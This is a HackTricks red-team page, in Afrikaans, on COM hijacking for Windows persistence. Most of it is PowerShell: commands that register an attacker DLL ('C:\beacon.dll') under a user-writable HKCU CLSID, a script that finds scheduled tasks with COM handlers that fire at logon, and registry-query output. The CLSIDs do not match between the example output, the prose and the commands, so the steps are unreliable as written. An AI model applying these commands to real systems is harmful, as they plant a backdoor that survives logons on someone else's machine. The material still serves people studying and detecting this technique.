# COM Kaping

<details>

<summary><strong>Leer AWS kaping vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou kapingstruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

### Soek na nie-bestaande COM-komponente

Aangesien die waardes van HKCU deur die gebruikers gewysig kan word, kan **COM-kaping** gebruik word as 'n **volhoubare meganisme**. Deur `procmon` te gebruik, is dit maklik om gesogte COM-registre te vind wat nie bestaan nie en wat 'n aanvaller kan skep om volhoubaar te wees. Filtreer:

* **RegOpenKey**-handelinge.
* waar die _Resultaat_ **NAME NOT FOUND** is.
* en die _Pad_ eindig met **InprocServer32**.

Sodra jy besluit het watter nie-bestaande COM jy wil voorstel, voer die volgende opdragte uit. _Wees versigtig as jy besluit om 'n COM voor te stel wat elke paar sekondes gelaai word, want dit kan oordrewe wees._&#x20;
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Gekaapte Taakbeplanner COM-komponente

Windows-take gebruik aangepaste trefskakelaars om COM-voorwerpe te roep, en omdat hulle deur die Taakbeplanner uitgevoer word, is dit makliker om te voorspel wanneer hulle geaktiveer sal word.

<pre class="language-powershell"><code class="lang-powershell"># Wys COM CLSIDs
$Take = Get-ScheduledTask

foreach ($Taak in $Take)
{
if ($Taak.Actions.ClassId -ne $null)
{
if ($Taak.Triggers.Enabled -eq $true)
{
$gebruikersSid = "S-1-5-32-545"
$gebruikersGroep = Get-LocalGroup | Where-Object { $_.SID -eq $gebruikersSid }

if ($Taak.Principal.GroupId -eq $gebruikersGroep)
{
Write-Host "Taaknaam: " $Taak.TaskName
Write-Host "Taakpad: " $Taak.TaskPath
Write-Host "CLSID: " $Taak.Actions.ClassId
Write-Host
}
}
}
}

# Voorbeelduitset:
<strong># Taaknaam:  Voorbeeld
</strong># Taakpad:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [meer soos die vorige...]</code></pre>

Deur die uitset te kontroleer, kan jy een kies wat byvoorbeeld **elke keer as 'n gebruiker inteken** uitgevoer sal word.

Soek nou na die CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** en in HKLM en HKCU, sal jy gewoonlik vind dat die waarde nie in HKCU bestaan nie.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Dan kan jy net die HKCU-inskrywing skep en elke keer as die gebruiker inteken, sal jou agterdeur geaktiveer word.

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>
